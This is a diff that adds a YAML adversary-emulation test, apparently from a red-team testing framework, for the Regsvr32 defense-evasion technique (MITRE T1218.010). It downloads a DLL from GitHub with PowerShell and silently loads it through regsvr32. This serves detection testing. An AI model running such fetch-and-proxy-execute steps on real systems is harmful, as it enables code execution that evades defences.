@@ -1,0 +1,37 @@
+api_version: "2.0"
+name: Regsvr32 Silent DLL Install Call DllRegisterServer
+description: Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.
+args:
+    - name: dll_name
+      type: string
+      default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
+    - name: regsvr32path
+      type: string
+      default: C:\Windows\system32
+    - name: regsvr32name
+      type: string
+      default: regsvr32.exe
+uuid: 9d71c492-ea2e-4c08-af16-c6994cdf029f
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.010: Regsvr32'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
+      inline: |
+        if (Test-Path "#{dll_name}") {exit 0} else {{New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"}}
+      executor: powershell
+    - name: regsvr32-silent-dll-install-call-dllregisterserver
+      inline: |
+        {{.Args.regsvr32path}}\{{.Args.regsvr32name}} /s /i "{{.Args.dll_name}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
